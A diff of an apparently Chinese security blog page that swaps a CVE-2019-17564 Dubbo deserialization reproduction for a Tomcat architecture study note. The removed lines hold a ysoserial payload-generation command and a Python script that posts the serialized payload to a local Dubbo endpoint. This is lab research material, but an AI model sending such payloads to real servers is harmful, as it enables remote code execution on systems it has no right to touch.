@@ -4,7 +4,7 @@
   <!-- 元数据 -->
   <meta charset="utf-8">
   <link rel="icon" href="images/favicon.ico">
-  <title>Dubbo HttpInvokerServiceExporter反序列化 | fmyyy</title>
+  <title>Tomcat学习 | fmyyy</title>
   <meta name="author" content="fmyyy" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -15,16 +15,16 @@
   
     <meta name="keywords" content="" />
   
-  <meta name="description" content="Dubbo HttpInvokerServiceExporter反序列化漏洞Dubbo简介Dubbo是阿里巴巴开源的基于 Java 的高性能 RPC(一种远程调用) 分布式服务框架(SOA)，致力于 提供高性能和透明化的RPC远程服务调用方案，以及SOA服务治理方案。dubbo 支持多种序列化方式并 且序列化是和协议相对应的。比如:Dubbo支持dubbo、rmi、hessian、http、web">
+  <meta name="description" content="Tomcat学习tomcat结构图   两个核心组件ConnectorConnector 连接器 Connector组件是负责生成请求对象和响应对象的，Tomcat默认的是HttpConnector，负责根据收到的Http请求报文生成Request对象和Response对象，并把这两个对象传递给Container，然后根据Response中的内容生成相应的HTTP报文。   监听网络端口。  接受">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Dubbo HttpInvokerServiceExporter反序列化">
-<meta property="og:url" content="https://fmyyy.gitee.io/2022/02/13/Dubbo%20HttpInvokerServiceExporter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:title" content="Tomcat学习">
+<meta property="og:url" content="https://fmyyy.gitee.io/2022/02/26/Tomcat%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="fmyyy">
-<meta property="og:description" content="Dubbo HttpInvokerServiceExporter反序列化漏洞Dubbo简介Dubbo是阿里巴巴开源的基于 Java 的高性能 RPC(一种远程调用) 分布式服务框架(SOA)，致力于 提供高性能和透明化的RPC远程服务调用方案，以及SOA服务治理方案。dubbo 支持多种序列化方式并 且序列化是和协议相对应的。比如:Dubbo支持dubbo、rmi、hessian、http、web">
+<meta property="og:description" content="Tomcat学习tomcat结构图   两个核心组件ConnectorConnector 连接器 Connector组件是负责生成请求对象和响应对象的，Tomcat默认的是HttpConnector，负责根据收到的Http请求报文生成Request对象和Response对象，并把这两个对象传递给Container，然后根据Response中的内容生成相应的HTTP报文。   监听网络端口。  接受">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://fmyyy.gitee.io/images/favicon.ico">
-<meta property="article:published_time" content="2022-02-13T11:14:04.000Z">
-<meta property="article:modified_time" content="2022-02-17T02:26:17.163Z">
+<meta property="article:published_time" content="2022-02-26T11:14:04.000Z">
+<meta property="article:modified_time" content="2022-03-08T12:27:18.510Z">
 <meta property="article:author" content="fmyyy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://fmyyy.gitee.io/images/favicon.ico">
@@ -171,17 +171,17 @@
     <div class="kratos-hentry kratos-post-inner clearfix">
         <header class="kratos-entry-header">
             
-                <h1 class="kratos-entry-title text-center">Dubbo HttpInvokerServiceExporter反序列化</h1>
+                <h1 class="kratos-entry-title text-center">Tomcat学习</h1>
             
             
             <ul class="kratos-post-meta text-center">
-                <li><i class="fa fa-calendar"></i> 2022-02-13</li>
+                <li><i class="fa fa-calendar"></i> 2022-02-26</li>
                 <li><i class="fa fa-user"></i> 作者 fmyyy</li>
                 <li>
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~3.01K
+                        ~2.89K
                     
                     字
                 </li>
@@ -190,58 +190,82 @@
         </header>
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1645064777163"></time> 前，其中的内容可能需要更新。
+                本文最后编辑于 <time datetime="1646742438510"></time> 前，其中的内容可能需要更新。
             </div>
             
                 <div class="kratos-post-inner-toc">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Dubbo-HttpInvokerServiceExporter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">Dubbo HttpInvokerServiceExporter反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Dubbo%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">Dubbo简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">1.2.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E5%AE%89%E8%A3%85"><span class="toc-number">1.2.2.</span> <span class="toc-text">注册中心安装</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">Tomcat学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%A4%E4%B8%AA%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">两个核心组件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Connector"><span class="toc-number">1.1.1.</span> <span class="toc-text">Connector</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Container"><span class="toc-number">1.1.2.</span> <span class="toc-text">Container</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Context"><span class="toc-number">1.2.</span> <span class="toc-text">Context</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%A7%8Dcontext"><span class="toc-number">1.2.1.</span> <span class="toc-text">三种context</span></a></li></ol></li></ol></li></ol>
                 </div>
             
             <hr />
-            <h1 id="Dubbo-HttpInvokerServiceExporter反序列化漏洞"><a href="#Dubbo-HttpInvokerServiceExporter反序列化漏洞" class="headerlink" title="Dubbo HttpInvokerServiceExporter反序列化漏洞"></a>Dubbo HttpInvokerServiceExporter反序列化漏洞</h1><h2 id="Dubbo简介"><a href="#Dubbo简介" class="headerlink" title="Dubbo简介"></a>Dubbo简介</h2><p>Dubbo是阿里巴巴开源的基于 Java 的高性能 RPC(一种远程调用) 分布式服务框架(SOA)，致力于 提供高性能和透明化的RPC远程服务调用方案，以及SOA服务治理方案。dubbo 支持多种序列化方式并 且序列化是和协议相对应的。比如:Dubbo支持dubbo、rmi、hessian、http、webservice、thrift、 redis等多种协议。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>我这边环境是mac</p>
-<p>dubbo源码地址</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo-samples">https://github.com/apache/dubbo-samples</a></p>
-<p>git下来,我们只需要dubbo-samples-http这一个项目就够了，idea打开其pom.xml即可，但为了复现得改一下版本,在pom.xml里直接添加（为了测试漏洞）</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.dubbo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="注册中心安装"><a href="#注册中心安装" class="headerlink" title="注册中心安装"></a>注册中心安装</h3><p>zookeeper下载，不知道为什么国内镜像都挂了，这个下起来贼慢</p>
-<p><a target="_blank" rel="noopener" href="https://archive.apache.org/dist/zookeeper/zookeeper-3.4.14/">https://archive.apache.org/dist/zookeeper/zookeeper-3.4.14/</a></p>
-<p>解压后在conf文件夹创建zoo.cfg，在里面复制以下内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 服务器与客户端之间交互的基本时间单元（ms）</span><br><span class="line">tickTime=2000</span><br><span class="line"># zookeeper所能接受的客户端数量</span><br><span class="line">initLimit=10</span><br><span class="line"># 服务器和客户端之间请求和应答之间的时间间隔</span><br><span class="line">syncLimit=5</span><br><span class="line"># 数据目录. 可以是任意目录.</span><br><span class="line">dataDir=/zookeeper-3.4.14/data</span><br><span class="line"># log目录, 同样可以是任意目录. 如果没有设置该参数, 将使用和#dataDir相同的设置.</span><br><span class="line">dataLogDir=/zookeeper-3.4.14/log</span><br><span class="line"># 监听client连接的端口号.</span><br><span class="line">clientPort=2181</span><br><span class="line"># the maximum number of client connections.</span><br><span class="line"># increase this if you need to handle more clients</span><br><span class="line">#maxClientCnxns=60</span><br><span class="line">#</span><br><span class="line"># Be sure to read the maintenance section of the </span><br><span class="line"># administrator guide before turning on autopurge.</span><br><span class="line">#</span><br><span class="line"># http://zookeeper.apache.org/doc/current/zookeeperAdmin.html#sc_maintenance</span><br><span class="line">#</span><br><span class="line"># The number of snapshots to retain in dataDir</span><br><span class="line">#autopurge.snapRetainCount=3</span><br><span class="line"># Purge task interval in hours</span><br><span class="line"># Set to &quot;0&quot; to disable auto purge feature</span><br><span class="line">#autopurge.purgeInterval=1</span><br></pre></td></tr></table></figure>
-
-<p>之后按系统环境启动zkServer即可</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞编号CVE-2019-17564</p>
-<p>影响版本</p>
+            <h1 id="Tomcat学习"><a href="#Tomcat学习" class="headerlink" title="Tomcat学习"></a>Tomcat学习</h1><p>tomcat结构图</p>
+<p><img src="https://img.le1a.com/2022/03/08/c4b4998eeb0fa.png" alt="1646697469317.png"></p>
+<p><img src="https://img.le1a.com/2022/03/08/6151cd73af7e3.png" alt="1646728914857.png"></p>
+<h2 id="两个核心组件"><a href="#两个核心组件" class="headerlink" title="两个核心组件"></a>两个核心组件</h2><h3 id="Connector"><a href="#Connector" class="headerlink" title="Connector"></a>Connector</h3><p>Connector 连接器</p>
+<p>Connector组件是负责生成请求对象和响应对象的，Tomcat默认的是HttpConnector，负责根据收到的Http请求报文生成Request对象和Response对象，并把这两个对象传递给Container，然后根据Response中的内容生成相应的HTTP报文。</p>
+<p><img src="https://img.le1a.com/2022/03/08/5f6c5a220121c.png" alt="1646702663690.png"></p>
 <ul>
-<li>Apache Dubbo 2.7.0 to 2.7.4；</li>
-<li>Apache Dubbo 2.6.0 to 2.6.7；</li>
-<li>Apache Dubbo all 2.5.x；</li>
+<li><p>监听网络端口。</p>
+</li>
+<li><p>接受网络连接请求。</p>
+</li>
+<li><p>读取请求网络字节流。</p>
+</li>
+<li><p>根据具体应用层协议（HTTP/AJP）解析字节流，生成统一的 Tomcat Request 对象。</p>
+</li>
+<li><p>将 Tomcat Request 对象转成标准的 ServletRequest。</p>
+</li>
+<li><p>调用 Servlet容器，得到 ServletResponse。</p>
+</li>
+<li><p>将 ServletResponse转成 Tomcat Response 对象。</p>
+</li>
+<li><p>将 Tomcat Response 转成网络字节流。</p>
+</li>
+<li><p>将响应字节流写回给浏览器。</p>
+</li>
 </ul>
-<p>运行HttpProvider，出现dubbo service started表示成功</p>
-<p><img src="https://img.le1a.com/2022/02/10/a9eb153840984.png" alt="1644430373880.png"></p>
-<p>yso生成payload</p>
-<p>这里有个问题，直接生成再用bp导入还是会有编码问题</p>
-<p><img src="https://img.le1a.com/2022/02/10/67f16007b21b8.png" alt="1644437254141.png"></p>
-<p>所以可以把payload base64编码一下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 /System/Applications/Calculator.app/Contents/MacOS/Calculator|base64 &gt; dubbo2.ser</span><br></pre></td></tr></table></figure>
-
-<p>之后python写个发包</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1:8080/org.apache.dubbo.samples.http.api.DemoService&quot;</span><br><span class="line">payload = &quot;生成的payload&quot;</span><br><span class="line">payload = base64.b64decode(payload)</span><br><span class="line"></span><br><span class="line">headers = &#123;&quot;Content-Type&quot;: &quot;application/x-java-serialized-object&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0&quot;&#125;#这里最好加上User-Agent方便debug</span><br><span class="line">res = requests.post(url,headers=headers,data=payload)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img.le1a.com/2022/02/10/b12d21da62d25.png" alt="1644437360649.png"></p>
-<p>报错信息</p>
-<p><img src="https://img.le1a.com/2022/02/10/0f9f3f5780de2.png" alt="1644495176316.png"></p>
-<p>起点是HttpServlet类的service方法</p>
-<p><img src="https://img.le1a.com/2022/02/10/c0ccff9863baf.png" alt="1644496572538.png"></p>
-<p>获取HttpHandler，若NULL则返回404，不为NULL则进入handle</p>
-<p><img src="https://img.le1a.com/2022/02/10/bf080bbd82af5.png" alt="1644496766251.png"></p>
-<p>获取uri，为POST方法则设置RPC服务，然后调用HttpInvokerServiceExporter类对象skeleton的handleRequest()函数进一步处理请求，这里Content-Type为<code>application/x-java-serialized-object</code>即Java序列化数据类型：</p>
-<p><img src="https://img.le1a.com/2022/02/10/713b06d31eb2e.png" alt="1644496915468.png"></p>
-<p>之后获取了POST的数据，进入handleRequest函数中，一路调用到doReadRemoteInvocation</p>
-<p><img src="https://img.le1a.com/2022/02/10/0ab69e4520887.png" alt="1644497357022.png"></p>
-<p>然后对我们post的数据做java原生反序列化触发命令执行。</p>
-<p><img src="https://img.le1a.com/2022/02/10/193e9ad774197.png" alt="1644497396476.png"></p>
+<p>同时为了解决Tomcat使用Request存放请求信息 而不是标准的ServletRequest这个问题，引入适配器模式，提供CoyoteAdapter，连接器调用 CoyoteAdapter 的 Sevice 方法，传入的是 Tomcat Request 对象，CoyoteAdapter负责将 Tomcat Request 转成 ServletRequest，再调用容器的 Service方法。</p>
+<h3 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h3><p><img src="https://img.le1a.com/2022/03/08/ed9ecfe7d37ae.png" alt="1646702848678.png"></p>
+<p>Container中还有四种容器，分别是 Engine、Host、Context和 Wrapper。</p>
+<p>一个 Host 多个 Context， 一个 Context 也包含多个 Servlet，而每个组件都需要统一生命周期管理，所以组合模式设计这些容器。</p>
+<ol>
+<li>Engine: 最顶层容器组件，可以包含多个Host。实现类为<code>org.apache.catalina.core.StandardEngine</code></li>
+<li>Host: 代表一个虚拟主机，每个虚拟主机和某个域名Domain Name相匹配，可以包含多个Context。实现类为<code>org.apache.catalina.core.StandardHost</code></li>
+<li>Context: 一个Context对应于一个Web 应用，可以包含多个Wrapper。实现类为<code>org.apache.catalina.core.StandardContext</code></li>
+<li>Wrapper: 一个Wrapper对应一个Servlet。负责管理 Servlet ，包括Servlet的装载、初始化、执行以及资源回收。实现类为<code>org.apache.catalina.core.StandardWrapper</code></li>
+</ol>
+<p>从请求如何定位到Servlet来看这几个容器的作用，</p>
+<p>Mapper 组件的功能就是将用户请求的 URL 定位到一个 Servlet，它的工作原理是：Mapper组件里保存了 Web 应用的配置信息，其实就是<strong>容器组件与访问路径的映射关系</strong>，比如 Host容器里配置的域名、Context容器里的 Web应用路径，以及 Wrapper容器里 Servlet 映射的路径，可以想象这些配置信息就是一个多层次的 Map。</p>
+<p><img src="https://img.le1a.com/2022/03/08/bee7f58faa7ec.png" alt="1646702881828.png"></p>
+<ul>
+<li><p>首先根据协议和端口号确定 Service 和 Engine<strong>。（</strong>Engine容器用于从 Connector 组件处接收已建立的 TCP 连接，还用于接收客户端发送的 HTTP 请求并分析请求，然后按照分析的结果将相关参数传递给匹配出的虚拟主机。）</p>
+</li>
+<li><p>根据域名选定 Host。（Host 容器定义虚拟主机，对应了服务器中一个网络名实体（如”<a target="_blank" rel="noopener" href="http://www.baidu.com”,或ip地址”23.0.32.1”).为了使用户可以通过域名连接/">www.baidu.com”，或IP地址”23.0.32.1”）。为了使用户可以通过域名连接</a> Tomcat 服务器，这个域名应该在域名服务器已经注册过。）</p>
+</li>
+<li><p>根据 URL 路径找到 Context 组件。（Context  容器主要是根据 path 和 docBase 获取一些信息，将结果交给其内的 wrapper 组件进行处理（它提供wrapper运行的环境，所以它叫上下文context）。）</p>
+</li>
+<li><p>根据 URL 路径找到 Wrapper（Servlet）。（wrapper 容器对应 Servlet 的处理过程。它开启 Servlet 的生命周期，根据 Context 给出的信息以及解析 web.xml 中的映射关系，负责装载相关的类，初始化 servlet 对象 init()、执行 servlet 代码 service() 以及服务结束时 servlet 对象的销毁 destory()。）</p>
+</li>
+</ul>
+<h2 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h2><p>这里想学一下Context这个组件，因为在内存马和回显里都遇到过。</p>
+<p><img src="https://img.le1a.com/2022/03/08/3294f55621c01.png" alt="1646729285994.png"></p>
+<p>每一个Context都有唯一的path。这里的path不是指servlet绑定的WebServlet地址，而是指独立的一个Web应用地址。就好比Tomat默认的<code>/</code>地址和<code>/manager</code>地址就是两个不同的web应用，所以对应两个不同的Context。要添加Context需要在server.xml中配置docbase。</p>
+<p>如下图所示， 在一个web应用中创建了2个servlet服务，WebServlet地址分别是<code>/Demo1</code>和<code>/Demo2</code>。 因为它们属于同一个Web应用所以Context一样，但访问地址不一样所以Wrapper不一样。<code>/manager</code>访问的Web应用是Tomcat默认的管理页面，是另外一个独立的web应用， 所以Context与前两个不一样。</p>
+<p><img src="https://img.le1a.com/2022/03/08/7a5058a0628ed.png" alt="1646729411034.png"></p>
+<h3 id="三种context"><a href="#三种context" class="headerlink" title="三种context"></a>三种context</h3><p>Tomcat中有三种Context</p>
+<p>ServletContext、StandardContext、ApplicationContext</p>
+<ul>
+<li><p>ServerletContext（是一个接口）</p>
+<p>通过<code>request.getServletContext()</code> 获取到的是ApplicationContextFacade对象，它是对ServerletContext接口的实现类，该类提供了Web应用所有Servlet的视图，可以对某个Web应用的各种资源和功能进行访问。</p>
+<p>WEB容器在启动时，它会为每个Web应用程序都创建一个对应的ServletContext。<strong>它代表当前Web应用，并且它被所有客户端共享</strong>。</p>
+</li>
+<li><p>ApplicationContext</p>
+<p>ApplicationContext也是对ServerletContext接口的实现类，由上图可知该类被包装在ApplicationContextFacade类中。</p>
+</li>
+<li><p>StandardContext</p>
+<p>org.apache.catalina.Context接口的默认实现为StandardContext，而Context在Tomcat中代表一个web应用。ApplicationContext所实现的方法其实都是调用的StandardContext中的方法，StandardContext是Tomcat中真正起作用的Context。</p>
+</li>
+</ul>
 
         </div>
         
@@ -295,7 +319,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "https://fmyyy.gitee.io/2022/02/13/Dubbo%20HttpInvokerServiceExporter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
+                text: "https://fmyyy.gitee.io/2022/02/26/Tomcat%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -307,9 +331,13 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "https://fmyyy.gitee.io/2022/02/13/Dubbo%20HttpInvokerServiceExporter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/";
-            const title         = "「Dubbo HttpInvokerServiceExporter反序列化」";
-            const excerpt       = `Dubbo HttpInvokerServiceExporter反序列化漏洞Dubbo简介Dubbo是阿里巴巴开源的基于 Java 的高性能 RPC(一种远程调用) 分布式服务框架(SOA)，致力于 提供高性能和透明化的RPC远程服务...`;
+            const hostUrl       = "https://fmyyy.gitee.io/2022/02/26/Tomcat%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/";
+            const title         = "「Tomcat学习」";
+            const excerpt       = `Tomcat学习tomcat结构图
+
+
+两个核心组件ConnectorConnector 连接器
+Connector组件是负责生成请求对象和响应对象的，Tomcat默认的是HttpConnector，负责根据收到的Http请求报文生成...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -331,7 +359,7 @@
                     
                 </div>
                 <div class="pull-date">
-                <span>最后编辑：2022-02-17</span>
+                <span>最后编辑：2022-03-08</span>
                 </div>
             </div>
         </footer>
@@ -340,12 +368,12 @@
         <nav class="navigation post-navigation clearfix" role="navigation">
             
             <div class="nav-previous clearfix">
-                <a title=" PWN学习-栈溢出基础" href="/2022/02/09/栈溢出基础/">&lt; 上一篇</a>
+                <a title=" jndi加载本地class绕过高版本限制" href="/2022/02/22/jndi加载本地class绕过高版本限制/">&lt; 上一篇</a>
             </div>
             
             
             <div class="nav-next clearfix">
-                <a title=" log4j" href="/2022/02/15/log4j/">下一篇 &gt;</a>
+                <a title=" 《深入理解java虚拟机》读书笔记1-类文件结构" href="/2022/03/01/《深入理解java虚拟机》读书笔记1-类文件结构/">下一篇 &gt;</a>
             </div>
             
         </nav>
@@ -388,7 +416,7 @@
         <span class="toc-progress-bar"></span>
     </h4>
     <div class="textwidget">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Dubbo-HttpInvokerServiceExporter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">Dubbo HttpInvokerServiceExporter反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Dubbo%E7%AE%80%E4%BB%8B"><span class="toc-text">Dubbo简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-text">源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E5%AE%89%E8%A3%85"><span class="toc-text">注册中心安装</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat%E5%AD%A6%E4%B9%A0"><span class="toc-text">Tomcat学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%A4%E4%B8%AA%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6"><span class="toc-text">两个核心组件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Connector"><span class="toc-text">Connector</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Container"><span class="toc-text">Container</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Context"><span class="toc-text">Context</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%A7%8Dcontext"><span class="toc-text">三种context</span></a></li></ol></li></ol></li></ol>
     </div>
 </aside>
                 
